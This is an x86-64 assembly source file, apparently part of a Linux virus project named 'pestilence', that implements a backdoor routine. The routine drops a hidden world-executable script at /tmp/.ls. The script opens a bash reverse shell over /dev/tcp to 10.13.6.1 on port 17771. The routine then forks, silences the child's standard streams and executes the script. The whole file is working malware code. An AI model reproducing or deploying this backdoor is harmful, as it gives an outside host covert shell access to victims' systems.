%define CREATE_BACKDOOR_S
%include "pestilence.lst"

section .text
	global _create_backdoor

_script_file:
	.name db '/tmp/.ls', 0
	.content db 0x23,0x21,0x2f,'bin',0x2f,'bash',10,'exec 5',0x3c,0x3e,0x2f,'dev',0x2f,'tcp',0x2f,'10.13.6.1',0x2f,'17771',0x3b,'cat ',0x3c,0x26,'5 ',0x7c,' while read line',0x3b,' do ',0x24,'line 2',0x3e,0x26,'5 ',0x3e,0x26,'5',0x3b,' done'
	.content_len equ $ - _script_file.content

;; -----------------------------------------------------------------------------------
;; NAME
;;		_create_backdoor
;;
;; SYNOPSIS
;;		void	_create_backdoor(void)
;;
;; DESCRIPTION
;;		Create a script file in /tmp/.ls, wich contain a script who try to connect
;;		to a client, and let access of bash to this client.
;;		Then the function fork, and on child, close fd 0/1/2 to avoid output, and exec
;;		the script created before.
;;
;; STACK USAGE
;;		rsp			: fd
;; -----------------------------------------------------------------------------------
_create_backdoor:
	enter 24, 0

; Open /tmp/.ls
	mov rax, SYS_OPEN
	lea rdi, [rel _script_file.name]
	mov rsi, O_RDWR | O_CREAT | O_TRUNC
	mov rdx, S_IRWXU | S_IRWXG | S_IRWXO
	syscall
	cmp rax, 0
	jl _backdoor_ret
	mov QWORD [rsp], rax

; Write content on this file
	mov rax, SYS_WRITE
	mov rdi, QWORD [rsp]
	lea rsi, [rel _script_file.content]
	mov rdx, _script_file.content_len
	syscall

; Then close our file
	mov rax, SYS_CLOSE
	mov rdi, QWORD [rsp]
	syscall

; Fork
	mov rax, SYS_FORK
	syscall
	cmp rax, 0
	je _child_exec

_backdoor_ret:
	leave
	ret

; Child part after fork, it will close 0/1/2 fd, and exec /bin/.ls
_child_exec:
; Close fd
	mov rax, SYS_CLOSE
	mov rdi, 0
	syscall
	mov rax, SYS_CLOSE
	mov rdi, 1
	syscall
	mov rax, SYS_CLOSE
	mov rdi, 2
	syscall

; Call execve
	mov rax, SYS_EXECVE
	lea rdi, [rel _script_file.name]
	mov rdx, 0
; Second arg is a char *argv[], so we push the null, and our file name addr.
; then we mov in rsi, the address of our tab, so rsp
	push rdx
	push rdi
	mov rsi, rsp
	syscall

%undef CREATE_BACKDOOR_S
